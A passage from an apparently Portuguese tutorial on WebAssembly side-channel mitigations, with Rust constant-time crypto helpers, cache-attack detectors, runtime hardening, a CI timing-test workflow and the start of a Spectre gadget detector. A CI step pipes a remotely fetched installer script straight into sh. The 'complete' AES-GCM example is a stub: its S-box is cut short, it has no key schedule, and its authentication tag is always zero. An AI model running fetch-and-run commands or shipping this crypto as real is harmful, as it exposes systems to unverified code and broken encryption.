            cache: [],
        };
    }

    // Medir performance do CPU
    measureCPUPerformance() {
        const iterations = 1000;
        const times = [];

        for (let i = 0; i < iterations; i++) {
            const start = performance.now();
            // Operação CPU-intensiva
            let sum = 0;
            for (let j = 0; j < 1000; j++) {
                sum += j;
            }
            const end = performance.now();
            times.push(end - start);
        }

        const avg = times.reduce((a, b) => a + b, 0) / times.length;
        this.metrics.cpu.push(avg);

        return {
            avgTime: avg,
            iterations,
            samples: this.metrics.cpu.length,
        };
    }

    // Medir performance de memória
    measureMemoryPerformance() {
        const iterations = 100;
        const times = [];

        for (let i = 0; i < iterations; i++) {
            const start = performance.now();
            // Operação de memória
            const array = new Array(10000).fill(0);
            array[5000] = 1;
            const _ = array[5000];
            const end = performance.now();
            times.push(end - start);
        }

        const avg = times.reduce((a, b) => a + b, 0) / times.length;
        this.metrics.memory.push(avg);

        return {
            avgTime: avg,
            iterations,
            samples: this.metrics.memory.length,
        };
    }

    // Medir performance de cache
    measureCachePerformance() {
        const iterations = 1000;
        const times = [];

        for (let i = 0; i < iterations; i++) {
            const start = performance.now();
            // Operação de cache
            const array = new Array(64).fill(0); // Uma cache line
            for (let j = 0; j < 64; j++) {
                array[j] = j;
            }
            const end = performance.now();
            times.push(end - start);
        }

        const avg = times.reduce((a, b) => a + b, 0) / times.length;
        this.metrics.cache.push(avg);

        return {
            avgTime: avg,
            iterations,
            samples: this.metrics.cache.length,
        };
    }

    // Gerar relatório de performance
    generateReport() {
        return {
            cpu: {
                avg: this.metrics.cpu.reduce((a, b) => a + b, 0) / this.metrics.cpu.length,
                samples: this.metrics.cpu.length,
            },
            memory: {
                avg: this.metrics.memory.reduce((a, b) => a + b, 0) / this.metrics.memory.length,
                samples: this.metrics.memory.length,
            },
            cache: {
                avg: this.metrics.cache.reduce((a, b) => a + b, 0) / this.metrics.cache.length,
                samples: this.metrics.cache.length,
            },
        };
    }
}

// Exemplo de uso
const hardwareInfo = getHardwareInfo();
const hardwareMitigations = checkHardwareMitigations();
const hardwareRecommendations = getHardwareRecommendations();

console.log('Informações de Hardware:', hardwareInfo);
console.log('Mitigações de Hardware:', hardwareMitigations);
console.log('Recomendações:', hardwareRecommendations);

// Medir performance
const perfMonitor = new HardwarePerformanceMonitor();
const cpuPerf = perfMonitor.measureCPUPerformance();
const memoryPerf = perfMonitor.measureMemoryPerformance();
const cachePerf = perfMonitor.measureCachePerformance();

console.log('Performance:', perfMonitor.generateReport());
```

## 10.11 Exemplos Completos de Mitigação

Esta seção apresenta exemplos completos e detalhados de como implementar mitigações contra side-channels em Wasm.

### 10.11.1 Exemplo Completo: Proteção de Biblioteca de Criptografia

```rust
// Exemplo completo: Proteção de biblioteca de criptografia contra side-channels

// 1. Definição do modelo de ameaças
pub mod threat_model {
    /// Modelo de ameaças para biblioteca de criptografia
    ///
    /// Ameaças consideradas:
    /// - Timing attacks via cache side-channel
    /// - Branch prediction attacks (Spectre)
    /// - Memory access pattern leaks
    /// - Power analysis (não aplicável em Wasm)
    ///
    /// Proteções implementadas:
    /// - Constant-time operations
    /// - Cache-resistant memory access
    /// - Branchless code paths
    /// - Bounds check hardening
    pub struct ThreatModel {
        pub timing_attacks: bool,
        pub cache_attacks: bool,
        pub branch_attacks: bool,
        pub memory_pattern_leaks: bool,
    }

    impl ThreatModel {
        pub fn new() -> Self {
            ThreatModel {
                timing_attacks: true,
                cache_attacks: true,
                branch_attacks: true,
                memory_pattern_leaks: true,
            }
        }
    }
}

// 2. Implementação constant-time de operações criptográficas
pub mod constant_time {
    use std::sync::atomic::{compiler_fence, Ordering};

    /// Comparação constante-time de dois slices
    pub fn ct_compare(a: &[u8], b: &[u8]) -> bool {
        if a.len() != b.len() {
            return false;
        }

        let mut diff = 0u8;

        // SEMPRE itera todos os bytes
        for i in 0..a.len() {
            // XOR detecta diferenças, OR acumula
            diff |= a[i] ^ b[i];
        }

        diff == 0
    }

    /// Seleção constante-time
    pub fn ct_select(condition: bool, a: u8, b: u8) -> u8 {
        // Máscara: 0xFF se condition é true, 0x00 senão
        let mask = (condition as u8).wrapping_neg();
        (a & mask) | (b & !mask)
    }

    /// Lookup constante-time em tabela
    pub fn ct_lookup(table: &[u8], index: usize) -> u8 {
        let mut result = 0u8;

        // SEMPRE acessa todos os elementos
        for i in 0..table.len() {
            // Máscara: 0xFF se i == index, 0x00 senão
            let mask = ct_mask(i == index);
            result = result.wrapping_add(table[i] & mask);
        }

        result
    }

    /// Máscara constante-time
    #[inline(always)]
    fn ct_mask(condition: bool) -> u8 {
        let mut mask = condition as u8;
        mask = mask.wrapping_neg(); // 0xFF se true, 0x00 se false
        mask
    }

    /// Barreira de compilação
    pub fn ct_barrier() {
        compiler_fence(Ordering::SeqCst);
    }

    /// Processamento de dados em tempo constante
    pub fn ct_process(data: &[u8], key: u8) -> Vec<u8> {
        let mut result = Vec::with_capacity(data.len());

        for &byte in data {
            // Barreira antes
            ct_barrier();

            // Processamento constante-time
            let processed = byte ^ key;

            // Barreira após
            ct_barrier();

            result.push(processed);
        }

        result
    }
}

// 3. Proteção contra cache side-channels
pub mod cache_protection {
    use std::collections::HashMap;

    /// Tamanho da cache line
    const CACHE_LINE_SIZE: usize = 64;

    /// Detector de padrões de cache suspeitos
    pub struct CacheAttackDetector {
        access_history: Vec<(usize, u64)>,
        line_access_count: HashMap<usize, usize>,
    }

    impl CacheAttackDetector {
        pub fn new() -> Self {
            CacheAttackDetector {
                access_history: Vec::new(),
                line_access_count: HashMap::new(),
            }
        }

        /// Registrar acesso à memória
        pub fn record_access(&mut self, address: usize, timestamp: u64) {
            let line_index = address / CACHE_LINE_SIZE;

            self.access_history.push((address, timestamp));
            *self.line_access_count.entry(line_index).or_insert(0) += 1;
        }

        /// Verificar se o padrão de acesso é suspeito
        pub fn is_suspicious(&self) -> bool {
            // Indicador 1: Muitos acessos a linhas diferentes
            if self.line_access_count.len() > 100 {
                return true;
            }

            // Indicador 2: Acessos sequenciais (padrão de flush+reload)
            if self.detect_sequential_pattern() {
                return true;
            }

            false
        }

        /// Detectar padrão sequencial
        fn detect_sequential_pattern(&self) -> bool {
            if self.access_history.len() < 10 {
                return false;
            }

            let recent: Vec<_> = self.access_history.iter().rev().take(10).collect();
            let mut sequential_count = 0;

            for i in 0..recent.len() - 1 {
                if recent[i + 1].0 as isize - recent[i].0 as isize == 1 {
                    sequential_count += 1;
                }
            }

            sequential_count > 7 // Mais de 70% sequenciais
        }

        /// Limpar histórico
        pub fn clear(&mut self) {
            self.access_history.clear();
            self.line_access_count.clear();
        }
    }

    /// Buffer de proteção contra cache
    pub struct CacheProtectionBuffer {
        buffer: Vec<u8>,
        size: usize,
    }

    impl CacheProtectionBuffer {
        pub fn new(size: usize) -> Self {
            CacheProtectionBuffer {
                buffer: vec![0u8; size],
                size,
            }
        }

        /// Acesso protegido contra cache
        pub fn protected_access(&self, address: usize) -> u8 {
            if address >= self.size {
                return 0;
            }

            // Acessar buffer de proteção primeiro
            // para "poluir" o cache
            for i in (0..self.size).step_by(CACHE_LINE_SIZE) {
                unsafe {
                    let ptr = self.buffer.as_ptr().add(i);
                    std::ptr::read_volatile(ptr);
                }
            }

            // Agora acessar o endereço desejado
            self.buffer[address]
        }
    }
}

// 4. Implementação completa de AES-GCM
pub mod aes_gcm {
    use super::constant_time::*;

    // S-box do AES (constante-time lookup)
    const AES_SBOX: [u8; 256] = [
        0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5,
        0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
        // ... restante da S-box
    ];

    /// SubBytes constante-time
    fn ct_sub_bytes(state: &mut [u8; 16]) {
        for i in 0..16 {
            state[i] = ct_lookup(&AES_SBOX, state[i] as usize);
        }
    }

    /// MixColumns constante-time
    fn ct_mix_columns(state: &mut [u8; 16]) {
        for i in (0..16).step_by(4) {
            let a0 = state[i];
            let a1 = state[i + 1];
            let a2 = state[i + 2];
            let a3 = state[i + 3];

            state[i] = ct_gf_mul(a0, 2) ^ ct_gf_mul(a1, 3) ^ a2 ^ a3;
            state[i + 1] = a0 ^ ct_gf_mul(a1, 2) ^ ct_gf_mul(a2, 3) ^ a3;
            state[i + 2] = a0 ^ a1 ^ ct_gf_mul(a2, 2) ^ ct_gf_mul(a3, 3);
            state[i + 3] = ct_gf_mul(a0, 3) ^ a1 ^ a2 ^ ct_gf_mul(a3, 2);
        }
    }

    /// GF(2^8) multiplication constante-time
    fn ct_gf_mul(a: u8, b: u8) -> u8 {
        let mut p = 0u8;
        let mut a = a;
        let mut b = b;

        for _ in 0..8 {
            let mask = ct_mask((b & 1) == 1);
            p ^= a & mask;

            let carry = (a >> 7) & 1;
            a = (a << 1) & 0xFF;
            a ^= carry & 0x1B;
            b >>= 1;
        }

        p
    }

    /// Criptografia AES constante-time
    pub fn ct_aes_encrypt(block: &[u8; 16], key: &[u8; 16]) -> [u8; 16] {
        let mut state = *block;

        // Adicionar round key inicial
        ct_add_round_key(&mut state, key);

        // Rounds intermediários
        for round in 1..10 {
            ct_sub_bytes(&mut state);
            ct_shift_rows(&mut state);
            ct_mix_columns(&mut state);
            // Adicionar round key (simplificado)
        }

        // Último round
        ct_sub_bytes(&mut state);
        ct_shift_rows(&mut state);

        state
    }

    fn ct_add_round_key(state: &mut [u8; 16], round_key: &[u8; 16]) {
        for i in 0..16 {
            state[i] ^= round_key[i];
        }
    }

    fn ct_shift_rows(state: &mut [u8; 16]) {
        // Implementação constante-time de ShiftRows
        let temp = state[1];
        state[1] = state[5];
        state[5] = state[9];
        state[9] = state[13];
        state[13] = temp;
        // ... restante das rotações
    }

    /// GCM hash constante-time
    pub fn ct_gcm_hash(key: &[u8; 16], data: &[u8]) -> [u8; 16] {
        let mut hash = [0u8; 16];

        for chunk in data.chunks(16) {
            let mut block = [0u8; 16];
            block[..chunk.len()].copy_from_slice(chunk);

            for i in 0..16 {
                hash[i] ^= block[i];
            }

            // Multiplicação em GF(2^128)
            // (implementação simplificada)
        }

        hash
    }

    /// Criptografia AES-128-GCM completa
    pub fn ct_aes_gcm_encrypt(
        key: &[u8; 16],
        iv: &[u8],
        plaintext: &[u8],
        aad: &[u8],
    ) -> (Vec<u8>, [u8; 16]) {
        ct_barrier();

        // Derivar J0
        let j0 = derive_j0(iv);

        // Criptografar plaintext
        let ciphertext = ct_gctr(key, &j0, plaintext);

        // Calcular auth tag
        let tag = ct_gcm_tag(key, &j0, &ciphertext, aad);

        ct_barrier();

        (ciphertext, tag)
    }

    fn derive_j0(iv: &[u8]) -> [u8; 16] {
        let mut j0 = [0u8; 16];
        if iv.len() == 12 {
            j0[..12].copy_from_slice(iv);
            j0[15] = 1;
        }
        j0
    }

    fn ct_gctr(key: &[u8; 16], icb: &[u8; 16], plaintext: &[u8]) -> Vec<u8> {
        let mut ciphertext = vec![0u8; plaintext.len()];
        let mut cb = *icb;

        for i in (0..plaintext.len()).step_by(16) {
            let encrypted_cb = ct_aes_encrypt(&cb, key);
            let block_len = (plaintext.len() - i).min(16);

            for j in 0..block_len {
                ciphertext[i + j] = plaintext[i + j] ^ encrypted_cb[j];
            }

            // Incrementar counter
            cb = increment_counter(&cb);
        }

        ciphertext
    }

    fn increment_counter(counter: &[u8; 16]) -> [u8; 16] {
        let mut result = *counter;
        for i in (0..16).rev() {
            if result[i] < 255 {
                result[i] += 1;
                break;
            }
            result[i] = 0;
        }
        result
    }

    fn ct_gcm_tag(
        key: &[u8; 16],
        j0: &[u8; 16],
        ciphertext: &[u8],
        aad: &[u8],
    ) -> [u8; 16] {
        // Implementação simplificada
        let mut tag = [0u8; 16];
        // ... cálculo da tag
        tag
    }
}

// 5. Verificação de timing
pub mod timing_verification {
    use std::time::Instant;

    /// Verificar se uma operação é constante-time
    pub fn verify_constant_time<F>(
        operation: F,
        iterations: usize,
        threshold: f64,
    ) -> bool
    where
        F: Fn(),
    {
        let mut timings = Vec::with_capacity(iterations);

        for _ in 0..iterations {
            let start = Instant::now();
            operation();
            let elapsed = start.elapsed().as_nanos() as f64;
            timings.push(elapsed);
        }

        // Calcular estatísticas
        let mean = timings.iter().sum::<f64>() / timings.len() as f64;
        let variance = timings.iter()
            .map(|&t| (t - mean).powi(2))
            .sum::<f64>() / timings.len() as f64;
        let std_dev = variance.sqrt();

        // Coeficiente de variação
        let cv = std_dev / mean;

        // Se CV for menor que o limiar, é constante-time
        cv < threshold
    }

    /// Medir variação de timing entre operações
    pub fn measure_timing_variation<F1, F2>(
        op1: F1,
        op2: F2,
        iterations: usize,
    ) -> (f64, f64)
    where
        F1: Fn(),
        F2: Fn(),
    {
        let mut timings1 = Vec::with_capacity(iterations);
        let mut timings2 = Vec::with_capacity(iterations);

        for _ in 0..iterations {
            let start = Instant::now();
            op1();
            timings1.push(start.elapsed().as_nanos() as f64);

            let start = Instant::now();
            op2();
            timings2.push(start.elapsed().as_nanos() as f64);
        }

        let mean1 = timings1.iter().sum::<f64>() / timings1.len() as f64;
        let mean2 = timings2.iter().sum::<f64>() / timings2.len() as f64;

        (mean1, mean2)
    }
}

// 6. Exemplo de uso completo
pub fn example_protected_crypto_library() {
    use constant_time::*;
    use aes_gcm::*;

    // Dados de teste
    let key = [0x42u8; 16];
    let iv = [0x24u8; 12];
    let plaintext = b"Hello, World! This is a secret message.";
    let aad = b"Additional authenticated data";

    // Criptografar
    let (ciphertext, tag) = ct_aes_gcm_encrypt(&key, &iv, plaintext, aad);

    // Verificar que é constante-time
    let is_constant_time = timing_verification::verify_constant_time(
        || {
            let _ = ct_aes_gcm_encrypt(&key, &iv, plaintext, aad);
        },
        1000,
        0.1, // 10% de variação máxima
    );

    println!("Criptografia é constante-time: {}", is_constant_time);
    println!("Ciphertext: {:02x?}", ciphertext);
    println!("Tag: {:02x?}", tag);
}
```

### 10.11.2 Exemplo Completo: Hardening de Runtime de Plugins Wasm

```rust
// Exemplo completo: Hardening de runtime de plugins Wasm

// 1. Configuração de isolamento de memória
pub mod memory_isolation {
    /// Configuração de isolamento de memória para plugins Wasm
    pub struct MemoryIsolationConfig {
        pub max_memory_pages: u32,
        pub enable_bounds_checking: bool,
        pub enable_guard_regions: bool,
        pub max_stack_size: usize,
        pub enable_heap_protection: bool,
    }

    impl MemoryIsolationConfig {
        pub fn secure() -> Self {
            MemoryIsolationConfig {
                max_memory_pages: 256, // 16MB
                enable_bounds_checking: true,
                enable_guard_regions: true,
                max_stack_size: 1024 * 1024, // 1MB
                enable_heap_protection: true,
            }
        }

        pub fn restrictive() -> Self {
            MemoryIsolationConfig {
                max_memory_pages: 64, // 4MB
                enable_bounds_checking: true,
                enable_guard_regions: true,
                max_stack_size: 256 * 1024, // 256KB
                enable_heap_protection: true,
            }
        }
    }

    /// Gerenciador de memória isolada
    pub struct IsolatedMemoryManager {
        config: MemoryIsolationConfig,
        memory_usage: usize,
        access_log: Vec<MemoryAccess>,
    }

    struct MemoryAccess {
        address: usize,
        size: usize,
        is_write: bool,
        timestamp: u64,
    }

    impl IsolatedMemoryManager {
        pub fn new(config: MemoryIsolationConfig) -> Self {
            IsolatedMemoryManager {
                config,
                memory_usage: 0,
                access_log: Vec::new(),
            }
        }

        /// Verificar se acesso é válido
        pub fn validate_access(&self, address: usize, size: usize, is_write: bool) -> bool {
            // Verificar limites de memória
            let max_address = self.config.max_memory_pages as usize * 65536;
            if address + size > max_address {
                return false;
            }

            // Verificar se está em região protegida
            if self.config.enable_guard_regions {
                // Regiões de guarda no início e fim
                if address < 4096 || address + size > max_address - 4096 {
                    return false;
                }
            }

            true
        }

        /// Registrar acesso à memória
        pub fn record_access(&mut self, address: usize, size: usize, is_write: bool) {
            if self.config.enable_bounds_checking {
                self.access_log.push(MemoryAccess {
                    address,
                    size,
                    is_write,
                    timestamp: self.get_timestamp(),
                });
            }
        }

        fn get_timestamp(&self) -> u64 {
            // Usar performance.now() em Wasm
            0 // Simplificado
        }

        /// Analisar padrões de acesso
        pub fn analyze_access_patterns(&self) -> AccessPatternAnalysis {
            let mut write_count = 0;
            let mut read_count = 0;
            let mut unique_addresses = std::collections::HashSet::new();

            for access in &self.access_log {
                if access.is_write {
                    write_count += 1;
                } else {
                    read_count += 1;
                }
                unique_addresses.insert(access.address);
            }

            AccessPatternAnalysis {
                total_accesses: self.access_log.len(),
                read_count,
                write_count,
                unique_addresses: unique_addresses.len(),
                is_sequential: self.detect_sequential_pattern(),
            }
        }

        fn detect_sequential_pattern(&self) -> bool {
            if self.access_log.len() < 10 {
                return false;
            }

            let mut sequential_count = 0;
            for i in 1..self.access_log.len() {
                if self.access_log[i].address as isize - self.access_log[i - 1].address as isize == 1 {
                    sequential_count += 1;
                }
            }

            sequential_count > self.access_log.len() / 2
        }
    }

    #[derive(Debug)]
    pub struct AccessPatternAnalysis {
        pub total_accesses: usize,
        pub read_count: usize,
        pub write_count: usize,
        pub unique_addresses: usize,
        pub is_sequential: bool,
    }
}

// 2. Análise de padrões de acesso a memória
pub mod memory_pattern_analysis {
    use std::collections::HashMap;

    /// Analisador de padrões de acesso a memória
    pub struct MemoryPatternAnalyzer {
        access_history: Vec<(usize, u64)>,
        line_access_count: HashMap<usize, usize>,
        cache_line_size: usize,
    }

    impl MemoryPatternAnalyzer {
        pub fn new(cache_line_size: usize) -> Self {
            MemoryPatternAnalyzer {
                access_history: Vec::new(),
                line_access_count: HashMap::new(),
                cache_line_size,
            }
        }

        /// Registrar acesso
        pub fn record_access(&mut self, address: usize, timestamp: u64) {
            let line_index = address / self.cache_line_size;

            self.access_history.push((address, timestamp));
            *self.line_access_count.entry(line_index).or_insert(0) += 1;
        }

        /// Analisar padrões
        pub fn analyze(&self) -> PatternAnalysis {
            // Calcular estatísticas
            let total_accesses = self.access_history.len();
            let unique_lines = self.line_access_count.len();

            // Detectar padrão sequencial
            let is_sequential = self.detect_sequential();

            // Detectar padrão de cache (flush+reload)
            let cache_pattern = self.detect_cache_pattern();

            PatternAnalysis {
                total_accesses,
                unique_lines,
                is_sequential,
                cache_pattern,
                risk_level: self.calculate_risk_level(),
            }
        }

        fn detect_sequential(&self) -> bool {
            if self.access_history.len() < 10 {
                return false;
            }

            let recent: Vec<_> = self.access_history.iter().rev().take(10).collect();
            let mut sequential_count = 0;

            for i in 0..recent.len() - 1 {
                if recent[i + 1].0 as isize - recent[i].0 as isize == 1 {
                    sequential_count += 1;
                }
            }

            sequential_count > 7
        }

        fn detect_cache_pattern(&self) -> CachePattern {
            // Procurar por padrão de flush+reload
            let mut address_counts: HashMap<usize, usize> = HashMap::new();

            for &(address, _) in &self.access_history {
                *address_counts.entry(address).or_insert(0) += 1;
            }

            // Se algum endereço é acessado muitas vezes, pode ser flush+reload
            let max_count = address_counts.values().max().unwrap_or(&0);

            if *max_count > 5 {
                CachePattern::FlushReload
            } else if self.line_access_count.len() > 50 {
                CachePattern::PrimeProbe
            } else {
                CachePattern::Normal
            }
        }

        fn calculate_risk_level(&self) -> RiskLevel {
            let analysis = PatternAnalysis {
                total_accesses: self.access_history.len(),
                unique_lines: self.line_access_count.len(),
                is_sequential: self.detect_sequential(),
                cache_pattern: self.detect_cache_pattern(),
                risk_level: RiskLevel::Low, // Será calculado
            };

            if analysis.cache_pattern != CachePattern::Normal {
                RiskLevel::High
            } else if analysis.is_sequential && analysis.unique_lines > 20 {
                RiskLevel::Medium
            } else {
                RiskLevel::Low
            }
        }
    }

    #[derive(Debug)]
    pub struct PatternAnalysis {
        pub total_accesses: usize,
        pub unique_lines: usize,
        pub is_sequential: bool,
        pub cache_pattern: CachePattern,
        pub risk_level: RiskLevel,
    }

    #[derive(Debug, PartialEq)]
    pub enum CachePattern {
        Normal,
        FlushReload,
        PrimeProbe,
    }

    #[derive(Debug, PartialEq)]
    pub enum RiskLevel {
        Low,
        Medium,
        High,
    }
}

// 3. Layout de memória otimizado para cache
pub mod cache_friendly_memory {
    /// Layout de memória otimizado para reduzir cache side-channels
    pub struct CacheFriendlyLayout {
        data: Vec<u8>,
        padding: Vec<u8>,
        size: usize,
        alignment: usize,
    }

    impl CacheFriendlyLayout {
        pub fn new(size: usize, alignment: usize) -> Self {
            // Calcular tamanho total com padding
            let padded_size = (size + alignment - 1) & !(alignment - 1);

            CacheFriendlyLayout {
                data: vec![0u8; padded_size],
                padding: vec![0u8; alignment],
                size,
                alignment,
            }
        }

        /// Acesso à memória com padding para alinhamento
        pub fn access(&self, index: usize) -> u8 {
            if index >= self.size {
                return 0;
            }

            // Acessar com alinhamento
            let aligned_index = (index / self.alignment) * self.alignment;
            let offset = index % self.alignment;

            self.data[aligned_index + offset]
        }

        /// Acesso seguro com bounds checking
        pub fn safe_access(&self, index: usize) -> Option<u8> {
            if index >= self.size {
                return None;
            }

            Some(self.access(index))
        }

        /// Pré-carregar dados no cache
        pub fn preload(&self) {
            // Acessar todos os elementos para pré-carregar no cache
            for i in (0..self.size).step_by(self.alignment) {
                unsafe {
                    let ptr = self.data.as_ptr().add(i);
                    std::ptr::read_volatile(ptr);
                }
            }
        }

        /// Limpar cache (para testes)
        pub fn flush_cache(&self) {
            // Acessar buffer grande para forçar eviction
            let flush_size = 2 * 1024 * 1024; // 2MB
            let flush_buffer = vec![0u8; flush_size];

            for i in (0..flush_size).step_by(64) {
                unsafe {
                    let ptr = flush_buffer.as_ptr().add(i);
                    std::ptr::read_volatile(ptr);
                }
            }

            std::hint::black_box(&flush_buffer);
        }
    }
}

// 4. Configuração de isolamento do navegador
pub mod browser_isolation {
    /// Configuração de isolamento para plugins Wasm
    pub struct BrowserIsolationConfig {
        pub enable_site_isolation: bool,
        pub enable_coop: bool,
        pub enable_coep: bool,
        pub enable_corp: bool,
        pub enable_csp: bool,
        pub restrict_shared_array_buffer: bool,
    }

    impl BrowserIsolationConfig {
        pub fn secure() -> Self {
            BrowserIsolationConfig {
                enable_site_isolation: true,
                enable_coop: true,
                enable_coep: true,
                enable_corp: true,
                enable_csp: true,
                restrict_shared_array_buffer: true,
            }
        }

        /// Gerar headers de segurança
        pub fn generate_headers(&self) -> Vec<(String, String)> {
            let mut headers = Vec::new();

            if self.enable_coop {
                headers.push((
                    "Cross-Origin-Opener-Policy".to_string(),
                    "same-origin".to_string(),
                ));
            }

            if self.enable_coep {
                headers.push((
                    "Cross-Origin-Embedder-Policy".to_string(),
                    "require-corp".to_string(),
                ));
            }

            if self.enable_corp {
                headers.push((
                    "Cross-Origin-Resource-Policy".to_string(),
                    "cross-origin".to_string(),
                ));
            }

            if self.enable_csp {
                headers.push((
                    "Content-Security-Policy".to_string(),
                    "default-src 'self'; script-src 'self' 'unsafe-eval'".to_string(),
                ));
            }

            headers
        }

        /// Verificar se o ambiente está isolado
        pub fn verify_isolation(&self) -> bool {
            // Em um ambiente real, verificaríamos as headers
            // Aqui retornamos a configuração
            self.enable_site_isolation
                && self.enable_coop
                && self.enable_coep
        }
    }
}

// 5. Exemplo de uso completo
pub fn example_hardened_wasm_runtime() {
    use memory_isolation::*;
    use memory_pattern_analysis::*;
    use cache_friendly_memory::*;
    use browser_isolation::*;

    println!("=== Exemplo de Runtime Wasm Hardened ===\n");

    // 1. Configurar isolamento de memória
    let memory_config = MemoryIsolationConfig::secure();
    let mut memory_manager = IsolatedMemoryManager::new(memory_config);

    // Simular acessos à memória
    for i in 0..1000 {
        let address = (i * 64) % (256 * 65536); // Mapear para 16MB
        memory_manager.record_access(address, 64, i % 2 == 0);
    }

    // Analisar padrões
    let analysis = memory_manager.analyze_access_patterns();
    println!("Análise de Memória: {:?}", analysis);

    // 2. Analisar padrões de acesso
    let mut pattern_analyzer = MemoryPatternAnalyzer::new(64);
    for i in 0..1000 {
        let address = (i * 64) % (256 * 65536);
        pattern_analyzer.record_access(address, i as u64);
    }

    let pattern_analysis = pattern_analyzer.analyze();
    println!("Análise de Padrões: {:?}", pattern_analysis);

    // 3. Usar layout otimizado para cache
    let layout = CacheFriendlyLayout::new(1024, 64);
    for i in 0..1024 {
        let _ = layout.safe_access(i);
    }

    // 4. Configurar isolamento do navegador
    let isolation_config = BrowserIsolationConfig::secure();
    let headers = isolation_config.generate_headers();

    println!("Headers de Segurança:");
    for (name, value) in &headers {
        println!("  {}: {}", name, value);
    }

    println!("Isolamento Verificado: {}", isolation_config.verify_isolation());
}
```

### 10.11.3 Testes de Regressão de Timing para CI/CD

```yaml
# Exemplo de pipeline CI/CD com testes de timing

name: Wasm Security Tests

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  timing-tests:
    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v3

    - name: Setup Rust
      uses: actions-rs/toolchain@v1
      with:
        toolchain: stable
        target: wasm32-unknown-unknown

    - name: Install wasm-pack
      run: curl https://rustwasm.github.io/wasm-pack/installer/init.sh -sSf | sh

    - name: Build Wasm
      run: wasm-pack build --release --target web

    - name: Run Timing Tests
      run: |
        # Executar testes de timing
        cargo test --release -- --test-threads=1

        # Verificar se há timing leaks
        python3 scripts/verify_timing.py

    - name: Run Cache Attack Tests
      run: |
        # Executar testes de cache attack
        python3 scripts/test_cache_attacks.py

    - name: Run Spectre Tests
      run: |
        # Executar testes de Spectre
        python3 scripts/test_spectre.py

    - name: Generate Report
      run: |
        # Gerar relatório de segurança
        python3 scripts/generate_security_report.py

    - name: Upload Report
      uses: actions/upload-artifact@v3
      with:
        name: security-report
        path: reports/
```

```python
# scripts/verify_timing.py
#!/usr/bin/env python3
"""Script para verificar timing leaks em código Wasm"""

import subprocess
import json
import sys
from typing import Dict, List

class TimingVerifier:
    def __init__(self):
        self.results = {}

    def run_timing_tests(self) -> Dict:
        """Executar testes de timing"""
        # Executar testes Rust
        result = subprocess.run(
            ['cargo', 'test', '--release', '--', '--test-threads=1', '--nocapture'],
            capture_output=True,
            text=True,
            cwd='/home/Projetos/DevSecurity'
        )

        # Analisar saída
        output = result.stdout + result.stderr

        # Extrair métricas de timing
        timing_data = self.extract_timing_data(output)

        return timing_data

    def extract_timing_data(self, output: str) -> Dict:
        """Extrair dados de timing da saída"""
        timing_data = {}

        for line in output.split('\n'):
            if 'timing:' in line.lower():
                parts = line.split(':')
                if len(parts) >= 2:
                    name = parts[0].strip()
                    value = parts[1].strip()
                    try:
                        timing_data[name] = float(value)
                    except ValueError:
                        pass

        return timing_data

    def verify_constant_time(self, timing_data: Dict, threshold: float = 0.1) -> bool:
        """Verificar se operações são constant-time"""
        if not timing_data:
            return False

        # Calcular coeficiente de variação
        values = list(timing_data.values())
        mean = sum(values) / len(values)
        variance = sum((x - mean) ** 2 for x in values) / len(values)
        std_dev = variance ** 0.5

        cv = std_dev / mean if mean > 0 else 0

        # Verificar se CV está dentro do limiar
        return cv < threshold

    def detect_timing_leaks(self, timing_data: Dict) -> List[str]:
        """Detectar timing leaks"""
        leaks = []

        # Verificar se há variação significativa
        if timing_data:
            values = list(timing_data.values())
            if len(values) > 1:
                max_diff = max(values) - min(values)
                mean = sum(values) / len(values)

                if mean > 0 and max_diff / mean > 0.2:
                    leaks.append(f"Variação significativa detectada: {max_diff/mean:.2%}")

        return leaks

    def generate_report(self, timing_data: Dict, leaks: List[str]) -> str:
        """Gerar relatório"""
        report = "=== Relatório de Verificação de Timing ===\n\n"

        report += "Dados de Timing:\n"
        for name, value in timing_data.items():
            report += f"  {name}: {value:.4f}ms\n"

        report += f"\nCoeficiente de Variação: "
        if timing_data:
            values = list(timing_data.values())
            mean = sum(values) / len(values)
            variance = sum((x - mean) ** 2 for x in values) / len(values)
            cv = (variance ** 0.5) / mean if mean > 0 else 0
            report += f"{cv:.4f}\n"
        else:
            report += "N/A\n"

        report += f"\nTiming Leaks Detectados: {len(leaks)}\n"
        for leak in leaks:
            report += f"  - {leak}\n"

        return report

def main():
    verifier = TimingVerifier()

    print("Executando testes de timing...")
    timing_data = verifier.run_timing_tests()

    print("Verificando constant-time...")
    is_constant_time = verifier.verify_constant_time(timing_data)

    print("Detectando timing leaks...")
    leaks = verifier.detect_timing_leaks(timing_data)

    print("Gerando relatório...")
    report = verifier.generate_report(timing_data, leaks)
    print(report)

    # Salvar relatório
    with open('reports/timing_report.txt', 'w') as f:
        f.write(report)

    # Verificar se há problemas
    if not is_constant_time or leaks:
        print("\nERRO: Timing leaks detectados!")
        sys.exit(1)
    else:
        print("\nOK: Código é constante-time")
        sys.exit(0)

if __name__ == '__main__':
    main()
```

## 10.12 Ferramentas de Análise de Side-Channels

Esta seção apresenta ferramentas e frameworks disponíveis para análise e detecção de side-channels em Wasm.

### 10.12.1 Detectores e Analisadores de Spectre

```python
# Detectores e analisadores de Spectre

import subprocess
import json
from typing import Dict, List, Tuple

class SpectreDetector:
    """Detector de vulnerabilidades Spectre em código Wasm"""

    def __init__(self):
        self.gadgets = []
        self.vulnerabilities = []

    def analyze_code(self, code_path: str) -> Dict:
        """Analisar código para gadgets Spectre"""
        results = {
            'gadgets': [],
            'vulnerabilities': [],
            'recommendations': []
        }

        # Ler código
        with open(code_path, 'r') as f:
            code = f.read()

        # Procurar por padrões vulneráveis
        results['gadgets'] = self.find_spectre_gadgets(code)
        results['vulnerabilities'] = self.find_vulnerabilities(code)
        results['recommendations'] = self.generate_recommendations(results)

        return results

    def find_spectre_gadgets(self, code: str) -> List[Dict]:
        """Encontrar gadgets Spectre no código"""
        gadgets = []

        # Padrões de gadgets Spectre v1
        patterns_v1 = [
            # Bounds check bypass
            (r'if\s*\(\s*\w+\s*<\s*\w+\.len\(\)\s*\)', 'Bounds check before access'),
            # Array access with secret index
            (r'\w+\[\s*\w+\s*\]', 'Array access with potentially secret index'),
            # Conditional access based on secret
            (r'if\s*\(\s*\w+\s*>\s*\w+\s*\)', 'Conditional access based on comparison'),
        ]

        # Padrões de gadgets Spectre v2
        patterns_v2 = [
            # Indirect function call
